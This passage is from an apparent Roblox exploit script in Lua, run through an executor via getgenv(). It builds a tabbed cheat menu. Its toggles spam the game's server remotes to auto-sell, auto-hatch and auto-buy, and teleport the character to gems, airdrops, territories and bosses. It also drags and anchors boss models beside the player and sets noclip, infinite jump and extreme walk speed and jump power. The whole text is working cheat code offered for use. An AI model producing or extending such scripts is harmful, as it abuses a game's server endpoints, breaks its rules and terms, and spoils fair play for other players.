            TweenService:Create(track, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(235, 60, 60)}):Play()
            TweenService:Create(knob, TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0, 3, 0.5, -5)}):Play()
        end
        task.spawn(callback, enabled)
    end)
    return track
end

local function createButton(parentTab, text, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 34)
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    btn.BorderSizePixel = 0
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(240, 240, 240)
    btn.TextSize = 13
    btn.Font = Enum.Font.SourceSansBold
    btn.Parent = parentTab

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 5)
    btnCorner.Parent = btn

    btn.MouseButton1Click:Connect(function()
        task.spawn(callback)
    end)
end

local function createSlider(parentTab, text, min, max, default, callback)
    local sliderFrame = Instance.new("Frame")
    sliderFrame.Size = UDim2.new(1, 0, 0, 44)
    sliderFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
    sliderFrame.BorderSizePixel = 0
    sliderFrame.Parent = parentTab

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 5)
    corner.Parent = sliderFrame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -20, 0, 18)
    label.Position = UDim2.new(0, 10, 0, 4)
    label.BackgroundTransparency = 1
    label.Text = text .. ": " .. tostring(default)
    label.TextColor3 = Color3.fromRGB(225, 225, 225)
    label.TextSize = 12
    label.Font = Enum.Font.SourceSansSemibold
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = sliderFrame

    local track = Instance.new("TextButton")
    track.Size = UDim2.new(1, -20, 0, 10)
    track.Position = UDim2.new(0, 10, 0, 26)
    track.BackgroundColor3 = Color3.fromRGB(45, 45, 52)
    track.Text = ""
    track.BorderSizePixel = 0
    track.Parent = sliderFrame

    local trackCorner = Instance.new("UICorner")
    trackCorner.CornerRadius = UDim.new(1, 0)
    trackCorner.Parent = track

    local fill = Instance.new("Frame")
    local startFactor = (default - min) / (max - min)
    fill.Size = UDim2.new(startFactor, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
    fill.BorderSizePixel = 0
    fill.Parent = track

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(1, 0)
    fillCorner.Parent = fill

    local dragging = false
    local function updateSlider(input)
        local pos = math.clamp((input.Position.X - track.AbsolutePosition.X) / track.AbsoluteSize.X, 0, 1)
        fill.Size = UDim2.new(pos, 0, 1, 0)
        local val = math.floor(min + (max - min) * pos)
        label.Text = text .. ": " .. tostring(val)
        task.spawn(callback, val)
    end

    track.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            updateSlider(input)
        end
    end)

    track.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            updateSlider(input)
        end
    end)
end

local function createLabel(parentTab, text)
    local labelFrame = Instance.new("Frame")
    labelFrame.Size = UDim2.new(1, 0, 0, 34)
    labelFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
    labelFrame.BorderSizePixel = 0
    labelFrame.Parent = parentTab

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 5)
    corner.Parent = labelFrame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -20, 1, 0)
    label.Position = UDim2.new(0, 10, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.fromRGB(225, 225, 225)
    label.TextSize = 13
    label.Font = Enum.Font.SourceSansSemibold
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = labelFrame

    return label
end

local function createStatDisplay(parentTab, titlePrefix)
    return createLabel(parentTab, titlePrefix .. ": 0")
end

-- Initialize Content Tabs (Og Event placed first at LayoutOrder = 1)
local tabOgEvent = createTab("🎆 Og Event", 1)
local tabMain = createTab("⚔️ Main", 2)
local tabCollectables = createTab("✨ Collectables", 3)
local tabBoss = createTab("👹 Boss", 4)
local tabEggs = createTab("🥚 Eggs", 5)
local tabShop = createTab("🛒 Shop", 6)
local tabStats = createTab("📊 Stats", 7)
local tabMisc = createTab("⚙️ Misc", 8)

---------------------------------------------------------
-- ENHANCED STATS TRACKER SYSTEM
---------------------------------------------------------
local sessionStartTime = os.time()
local totalGemsEarned = 0
local lastGemsValue = nil

local lblPing = createStatDisplay(tabStats, "📡 Network Ping")
local lblTime = createStatDisplay(tabStats, "⏱️ Elapsed Time")
local lblGemsMin = createStatDisplay(tabStats, "⚡ Gems / Min")
local lblTotalGems = createStatDisplay(tabStats, "💎 Gems Earned")

local function formatNumber(num)
    if num >= 1e9 then return string.format("%.2fB", num / 1e9)
    elseif num >= 1e6 then return string.format("%.2fM", num / 1e6)
    elseif num >= 1e3 then return string.format("%.1fK", num / 1e3)
    end
    return tostring(math.floor(num))
end

-- Dynamic Value Object Resolver
local function findGemStatObject()
    local searchNames = {"Gems", "Gem", "Diamonds", "Diamond", "GemsValue"}
    
    -- Check Leaderstats
    local leaderstats = Player:FindFirstChild("leaderstats") or Player:FindFirstChild("Leaderstats")
    if leaderstats then
        for _, name in ipairs(searchNames) do
            local found = leaderstats:FindFirstChild(name)
            if found and (found:IsA("IntValue") or found:IsA("NumberValue") or found:IsA("DoubleConstrainedValue")) then
                return found
            end
        end
    end
    
    -- Fallback scan on Player object for custom stats folders
    for _, child in ipairs(Player:GetChildren()) do
        if child:IsA("Folder") or child:IsA("Configuration") or child:IsA("Model") then
            for _, name in ipairs(searchNames) do
                local found = child:FindFirstChild(name)
                if found and (found:IsA("IntValue") or found:IsA("NumberValue")) then
                    return found
                end
            end
        end
    end
    return nil
end

createButton(tabStats, "🔄 Reset Stats", function()
    sessionStartTime = os.time()
    totalGemsEarned = 0
    lastGemsValue = nil
end)

task.spawn(function()
    while true do
        task.wait(1)
        
        -- Ping Reader Fix: Using Player:GetNetworkPing() for reliable ping measurement
        local currentPing = 0
        pcall(function()
            if Player and Player:GetNetworkPing() then
                currentPing = math.floor(Player:GetNetworkPing() * 1000)
            end
        end)
        lblPing.Text = "📡 Network Ping: " .. tostring(currentPing) .. " ms"

        local elapsedSec = math.max(1, os.time() - sessionStartTime)
        local elapsedMin = elapsedSec / 60

        local hours = math.floor(elapsedSec / 3600)
        local mins = math.floor((elapsedSec % 3600) / 60)
        local secs = elapsedSec % 60
        lblTime.Text = string.format("⏱️ Elapsed Time: %02d:%02d:%02d", hours, mins, secs)

        local gemsStat = findGemStatObject()
        if gemsStat then
            local currentGems = tonumber(gemsStat.Value) or 0
            if lastGemsValue == nil then
                lastGemsValue = currentGems
            else
                if currentGems > lastGemsValue then
                    totalGemsEarned = totalGemsEarned + (currentGems - lastGemsValue)
                end
                lastGemsValue = currentGems
            end
        end

        local gemsPerMin = totalGemsEarned / elapsedMin

        lblGemsMin.Text = "⚡ Gems / Min: " .. formatNumber(gemsPerMin)
        lblTotalGems.Text = "💎 Gems Earned: " .. formatNumber(totalGemsEarned)
    end
end)

---------------------------------------------------------
-- FEATURES MAPPING & WIRING
---------------------------------------------------------

-- === OG EVENT TAB ===
createToggle(tabOgEvent, "💰 Auto Sell & Freeze (OG)", false, function(Value)
    getgenv().AutoSellOg = Value
    if Value then
        local OgSellRing = workspace:FindFirstChild("Dimensions")
            and workspace.Dimensions:FindFirstChild("OgWorld")
            and workspace.Dimensions.OgWorld:FindFirstChild("RingAreas")
            and workspace.Dimensions.OgWorld.RingAreas:FindFirstChild("RangeSystem")
            and workspace.Dimensions.OgWorld.RingAreas.RangeSystem:FindFirstChild("Server")
            and workspace.Dimensions.OgWorld.RingAreas.RangeSystem.Server:FindFirstChild("OgSell")

        local HRP = getHRP()
        if HRP and OgSellRing then
            local targetCFrame = OgSellRing:IsA("Model") and OgSellRing:GetPivot() or OgSellRing.CFrame
            HRP.CFrame = targetCFrame * CFrame.new(0, 3, 0)
            task.wait(0.1) 
            HRP.Anchored = true
        elseif HRP then
            HRP.Anchored = true
        end
        
        task.spawn(function()
            while getgenv().AutoSellOg do
                RunService.Heartbeat:Wait() 
                local remote = SellStrengthRequest or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("SellStrengthRequest"))
                if remote then pcall(function() remote:FireServer() end) end
            end
        end)
    else
        local HRP = getHRP()
        if HRP then HRP.Anchored = false end
    end
end)

createToggle(tabOgEvent, "🥚 Auto Hatch OG Eggs (3x)", false, function(Value)
    getgenv().AutoHatchOgEgg = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoHatchOgEgg do
                local remote = PurchaseEggRemote or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Pets") and ReplicatedStorage.Remotes.Pets:FindFirstChild("PurchaseEgg"))
                if remote then
                    task.spawn(function() pcall(function() remote:InvokeServer(1, 3, "OgWorld") end) end)
                end
                task.wait(HatchDelay)
            end
        end)
    end
end)

createToggle(tabOgEvent, "🏋️ Auto Buy OG Weights", false, function(Value)
    getgenv().AutoBuyOgWeights = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoBuyOgWeights do
                local remote = RequestBuyAllRemote or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Shop") and ReplicatedStorage.Remotes.Shop:FindFirstChild("RequestBuyAll"))
                if remote then
                    task.spawn(function() pcall(function() remote:InvokeServer("Weight", "OgWorld") end) end)
                end
                task.wait(0.5)
            end
        end)
    end
end)

createToggle(tabOgEvent, "💪 Auto Buy OG Bodies", false, function(Value)
    getgenv().AutoBuyOgBodies = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoBuyOgBodies do
                local remote = RequestPurchaseRemote or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Shop") and ReplicatedStorage.Remotes.Shop:FindFirstChild("RequestPurchase"))
                if remote then
                    task.spawn(function()
                        for upgradeId = 2, 33 do
                            if not getgenv().AutoBuyOgBodies then break end
                            task.spawn(function() pcall(function() remote:InvokeServer(upgradeId, "BodyUpgrade", "OgWorld") end) end)
                        end
                    end)
                end
                task.wait(0.5)
            end
        end)
    end
end)

-- === MAIN TAB ===
createToggle(tabMain, "🏋️ Auto Lift", false, function(Value)
    getgenv().AutoLift = Value
    if Value then
        task.spawn(function()
            pcall(function()
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.One, false, game)
                task.wait(0.05)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.One, false, game)
            end)

            while getgenv().AutoLift do
                local Character = Player.Character
                local Backpack = Player:FindFirstChild("Backpack")
                
                if Character and Backpack then
                    local CurrentTool = Character:FindFirstChildOfClass("Tool")
                    if not CurrentTool then
                        local WeightTool = Backpack:FindFirstChildWhichIsA("Tool")
                        if WeightTool then
                            Character.Humanoid:EquipTool(WeightTool)
                        end
                    end
                end

                if LiftWeightRemote then 
                    LiftWeightRemote:FireServer()
                else
                    pcall(function()
                        local Tool = Character:FindFirstChildOfClass("Tool")
                        if Tool then Tool:Activate() end
                    end)
                end
                task.wait(0.1)
            end
        end)
    end
end)

createToggle(tabMain, "🥊 Auto Punch", false, function(Value)
    getgenv().AutoPunch = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoPunch do
                if AttackRemote then AttackRemote:FireServer("Punch", 1) end
                task.wait(0.05)
            end
        end)
    end
end)

createToggle(tabMain, "🥾 Auto Stomp", false, function(Value)
    getgenv().AutoStomp = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoStomp do
                if AttackRemote then AttackRemote:FireServer("Stomp") end
                task.wait(0.05)
            end
        end)
    end
end)

createToggle(tabMain, "📦 Auto Airdrop", false, function(Value)
    getgenv().AutoAirdrop = Value
    if Value then
        getgenv().AutoTerritories = false
        table.clear(AirdropCooldownList)
        task.spawn(function()
            while getgenv().AutoAirdrop do
                task.wait(0.5)
                local HRP = getHRP()
                local Model, Part = getAirdrop()
                
                if Model and Part and HRP and not getgenv().AutoGemTween then
                    HRP.CFrame = Part.CFrame * CFrame.new(0, 3, 0)
                    task.wait(15.0)
                    AirdropCooldownList[Model] = true
                    local returnCFrame = getKOTHCFrame()
                    local currentHRP = getHRP()
                    if returnCFrame and currentHRP then
                        currentHRP.CFrame = returnCFrame * CFrame.new(0, 3, 0)
                        task.wait(0.2) 
                    end
                end
            end
        end)
    end
end)

local TerritoriesTrack
TerritoriesTrack = createToggle(tabMain, "🚩 Auto Territories", false, function(Value)
    getgenv().AutoTerritories = Value
    if Value then
        getgenv().AutoGemTween = false
        getgenv().AutoGemBring = false
        getgenv().AutoAirdrop = false
        task.spawn(function()
            local territoryNames = {"T1", "T2", "T3", "T4", "T5"}
            local folder = workspace:FindFirstChild("RingAreas") and workspace.RingAreas:FindFirstChild("Territories")
            if folder then
                for i, name in ipairs(territoryNames) do
                    if not getgenv().AutoTerritories then break end
                    local targetZone = folder:FindFirstChild(name)
                    local HRP = getHRP()
                    if targetZone and HRP then
                        local targetCFrame = targetZone:IsA("BasePart") and targetZone.CFrame or targetZone:GetPivot()
                        HRP.CFrame = targetCFrame * CFrame.new(0, 4, 0)
                        HRP.Velocity = Vector3.new(0, -60, 0)
                        task.wait(0.05)
                        local elapsed = 0
                        while elapsed < 6.5 and getgenv().AutoTerritories do
                            task.wait(0.1)
                            elapsed = elapsed + 0.1
                            local currentHRP = getHRP()
                            if currentHRP then currentHRP.Velocity = Vector3.new(0, 0, 0) end
                        end
                    end
                end
                if getgenv().AutoTerritories then
                    getgenv().AutoTerritories = false
                    TweenService:Create(TerritoriesTrack, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(235, 60, 60)}):Play()
                end
            end
        end)
    end
end)

-- === COLLECTABLES TAB ===
createToggle(tabCollectables, "💎 Auto Gems (Tween)", false, function(Value)
    getgenv().AutoGemTween = Value
    getgenv().Noclip = Value
    
    if Value then
        getgenv().AutoGemBring = false 
        getgenv().AutoTerritories = false
        
        task.spawn(function()
            while getgenv().AutoGemTween do
                RunService.Heartbeat:Wait()
                local hrp = getHRP()
                if hrp then
                    local dropModel, dropPart = getAirdrop()
                    if getgenv().AutoAirdrop and dropModel and dropPart then
                        hrp.CFrame = dropPart.CFrame * CFrame.new(0, 3, 0)
                        hrp.AssemblyLinearVelocity = Vector3.new(0,0,0)
                        hrp.AssemblyAngularVelocity = Vector3.new(0,0,0)
                        
                        task.wait(15.0)
                        AirdropCooldownList[dropModel] = true
                        
                        local returnCFrame = getKOTHCFrame()
                        local updatedHRP = getHRP()
                        if returnCFrame and updatedHRP then
                            updatedHRP.CFrame = returnCFrame * CFrame.new(0, 3, 0)
                            task.wait(0.2)
                        end
                    else
                        local targetGem = getNearestGem()
                        if targetGem then
                            hrp.CFrame = hrp.CFrame:Lerp(targetGem.CFrame, GemSettings.TweenSpeed)
                            hrp.AssemblyLinearVelocity = Vector3.new(0,0,0)
                            hrp.AssemblyAngularVelocity = Vector3.new(0,0,0)
                        end
                    end
                end
            end
        end)
    end
end)

createToggle(tabCollectables, "⚡ Blink Gems", false, function(Value)
    getgenv().AutoGemBring = Value
    if Value then
        getgenv().AutoGemTween = false 
        getgenv().AutoTerritories = false
        table.clear(GemCooldownList)
        task.spawn(function()
            while getgenv().AutoGemBring do
                task.wait(GemDelay)
                local HRP = getHRP()
                local GemObject, GemPosition, GemSizeY = getBypassGem()
                if GemObject and GemPosition and HRP then
                    touchCooldown(GemObject)
                    local Orig = HRP.CFrame
                    HRP.CFrame = CFrame.new(GemPosition + Vector3.new(0, (GemSizeY / 2) + 2, 0))
                    task.wait(0.03)
                    local CurrentHRP = getHRP()
                    if CurrentHRP then CurrentHRP.CFrame = Orig end
                else task.wait(0.5) end
            end
        end)
    end
end)

-- === BOSS TAB ===
createToggle(tabBoss, "⚔️ Bring All Bosses", false, function(Value)
    getgenv().BossBring = Value
    if Value then
        task.spawn(function()
            while getgenv().BossBring do
                task.wait(0.1)
                local HRP = getHRP()
                if HRP and workspace:FindFirstChild("BossModels") then
                    for _, Boss in ipairs(workspace.BossModels:GetChildren()) do
                        if Boss:IsA("Model") and Boss:FindFirstChild("HumanoidRootPart") then
                            Boss.HumanoidRootPart.CFrame = HRP.CFrame * CFrame.new(0, -6.5, -7.5)
                            Boss.HumanoidRootPart.Anchored = true
                        end
                    end
                end
            end
        end)
    else
        if workspace:FindFirstChild("BossModels") then
            for _, Boss in ipairs(workspace.BossModels:GetChildren()) do
                if Boss:IsA("Model") and Boss:FindFirstChild("HumanoidRootPart") then
                    Boss.HumanoidRootPart.Anchored = false
                end
            end
        end
    end
end)

createToggle(tabBoss, "🚶 Walk To Boss", false, function(Value)
    getgenv().WalkToBoss = Value
    if Value then
        task.spawn(function()
            local BossModels = workspace:FindFirstChild("BossModels")
            if not BossModels then return end
            
            local targetFound = nil
            for _, b in ipairs(BossModels:GetChildren()) do
                if b:IsA("Model") then
                    targetFound = b:FindFirstChild("RightLowerLeg") or b:FindFirstChild("HumanoidRootPart") or b:FindFirstChildWhichIsA("BasePart")
                    if targetFound then break end
                end
            end
            
            local initialHRP = getHRP()
            if initialHRP and targetFound then
                initialHRP.CFrame = CFrame.new(targetFound.Position + Vector3.new(15, 2, 0))
                task.wait(0.1)
            end
            
            while getgenv().WalkToBoss do
                task.wait(0.1)
                local Character = Player.Character
                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
                
                local TargetPart = nil
                for _, b in ipairs(BossModels:GetChildren()) do
                    if b:IsA("Model") then
                        TargetPart = b:FindFirstChild("RightLowerLeg") or b:FindFirstChild("HumanoidRootPart") or b:FindFirstChildWhichIsA("BasePart")
                        if TargetPart then break end
                    end
                end
                
                if Humanoid and TargetPart then
                    Humanoid:MoveTo(TargetPart.Position)
                end
            end
        end)
    end
end)

createToggle(tabBoss, "⚡ Tp to boss", false, function(Value)
    getgenv().TpToBossKill = Value
    if Value then
        getgenv().WalkToBoss = false
        task.spawn(function()
            local BossModels = workspace:FindFirstChild("BossModels")
            if not BossModels then return end
            while getgenv().TpToBossKill do
                task.wait(0.01)
                local HRP = getHRP()
                local EnemyRoot = nil
                for _, b in ipairs(BossModels:GetChildren()) do
                    if b:IsA("Model") then
                        EnemyRoot = b:FindFirstChild("HumanoidRootPart") or b:FindFirstChildWhichIsA("BasePart")
                        if EnemyRoot then break end
                    end
                end
                if HRP and EnemyRoot then
                    HRP.CFrame = EnemyRoot.CFrame * CFrame.new(0, 0, 3.5)
                    HRP.Velocity = Vector3.new(0, 0, 0)
                end
            end
        end)
    end
end)

-- === EGGS TAB ===
createToggle(tabEggs, "🥚 Auto hatch Eggs", false, function(Value)
    getgenv().AutoHatchEgg = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoHatchEgg do
                local remote = PurchaseEggRemote or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Pets") and ReplicatedStorage.Remotes.Pets:FindFirstChild("PurchaseEgg"))
                if remote then
                    task.spawn(function() pcall(function() remote:InvokeServer(1, 1, "Islands") end) end)
                end
                task.wait(HatchDelay)
            end
        end)
    end
end)

createToggle(tabEggs, "🥚 Auto hatch Eggs 2", false, function(Value)
    getgenv().AutoHatchEgg2 = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoHatchEgg2 do
                local remote = PurchaseEggRemote or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Pets") and ReplicatedStorage.Remotes.Pets:FindFirstChild("PurchaseEgg"))
                if remote then
                    task.spawn(function() pcall(function() remote:InvokeServer(2, 1, "Islands") end) end)
                end
                task.wait(HatchDelay)
            end
        end)
    end
end)

createToggle(tabEggs, "🥚 Auto hatch 3 eggs", false, function(Value)
    getgenv().AutoHatch3Eggs = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoHatch3Eggs do
                local remote = PurchaseEggRemote or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Pets") and ReplicatedStorage.Remotes.Pets:FindFirstChild("PurchaseEgg"))
                if remote then
                    task.spawn(function() pcall(function() remote:InvokeServer(1, 3, "Islands") end) end)
                end
                task.wait(HatchDelay)
            end
        end)
    end
end)

-- === SHOP TAB ===
createToggle(tabShop, "💰 Infinite Auto Sell & Freeze", false, function(Value)
    getgenv().AutoSell = Value
    if Value then
        local SellRing = workspace:FindFirstChild("RingAreas") 
            and workspace.RingAreas:FindFirstChild("RangeSystem")
            and workspace.RingAreas.RangeSystem:FindFirstChild("Server")
            and workspace.RingAreas.RangeSystem.Server:FindFirstChild("Sell")

        local HRP = getHRP()
        if HRP and SellRing then
            local targetCFrame = SellRing:IsA("Model") and SellRing:GetPivot() or SellRing.CFrame
            HRP.CFrame = targetCFrame * CFrame.new(0, 3, 0)
            task.wait(0.1) 
            HRP.Anchored = true
        elseif HRP then
            HRP.Anchored = true
        end
        task.spawn(function()
            while getgenv().AutoSell do
                RunService.Heartbeat:Wait() 
                local remote = SellStrengthRequest or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("SellStrengthRequest"))
                if remote then pcall(function() remote:FireServer() end) end
            end
        end)
    else
        local HRP = getHRP()
        if HRP then HRP.Anchored = false end
    end
end)

createToggle(tabShop, "🏋️ Auto Buy Weights", false, function(Value)
    getgenv().AutoBuyWeights = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoBuyWeights do
                local remote = RequestBuyAllRemote or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Shop") and ReplicatedStorage.Remotes.Shop:FindFirstChild("RequestBuyAll"))
                if remote then
                    task.spawn(function() pcall(function() remote:InvokeServer("Weight", "Islands") end) end)
                end
                task.wait(0.5)
            end
        end)
    end
end)

createToggle(tabShop, "🧬 Auto Buy DNA", false, function(Value)
    getgenv().AutoBuyDNA = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoBuyDNA do
                local remote = RequestPurchaseRemote or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Shop") and ReplicatedStorage.Remotes.Shop:FindFirstChild("RequestPurchase"))
                if remote then
                    task.spawn(function()
                        for upgradeId = 1, 120 do
                            if not getgenv().AutoBuyDNA then break end
                            task.spawn(function() pcall(function() remote:InvokeServer(upgradeId, "DNA", "Islands") end) end)
                        end
                    end)
                end
                task.wait(0.5)
            end
        end)
    end
end)

createToggle(tabShop, "💪 Auto Buy Bodies", false, function(Value)
    getgenv().AutoBuyBodies = Value
    if Value then
        task.spawn(function()
            while getgenv().AutoBuyBodies do
                local remote = RequestPurchaseRemote or (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Shop") and ReplicatedStorage.Remotes.Shop:FindFirstChild("RequestPurchase"))
                if remote then
                    task.spawn(function()
                        for upgradeId = 2, 33 do
                            if not getgenv().AutoBuyBodies then break end
                            task.spawn(function() pcall(function() remote:InvokeServer(upgradeId, "BodyUpgrade", "Islands") end) end)
                        end
                    end)
                end
                task.wait(0.5)
            end
        end)
    end
end)

-- === MISC TAB ===
createToggle(tabMisc, "🔄 Auto Rejoin On Kick", false, function(Value)
    getgenv().AutoRejoin = Value
end)

createToggle(tabMisc, "🌌 Infinite Jump", false, function(Value)
    getgenv().InfiniteJump = Value
end)

createToggle(tabMisc, "👁️ Noclip Engine", false, function(Value)
    getgenv().Noclip = Value
end)

createToggle(tabMisc, "⚡ Enable Custom Speed", false, function(Value)
    getgenv().WalkSpeedToggle = Value
    if not Value then
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then Humanoid.WalkSpeed = 16 end
    end
end)

createSlider(tabMisc, "WalkSpeed", 16, 1000, 16, function(Value)
    getgenv().WalkSpeedValue = Value
    if getgenv().WalkSpeedToggle then
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then Humanoid.WalkSpeed = Value end
    end
end)

createToggle(tabMisc, "🦘 Enable Custom Jump", false, function(Value)
    getgenv().JumpPowerToggle = Value
    if not Value then
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then 
            Humanoid.UseJumpPower = true
            Humanoid.JumpPower = 50 
        end
    end
end)

createSlider(tabMisc, "JumpPower", 50, 500, 50, function(Value)
    getgenv().JumpPowerValue = Value
    if getgenv().JumpPowerToggle then
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then 
            Humanoid.UseJumpPower = true
            Humanoid.JumpPower = Value 
        end
    end
end)
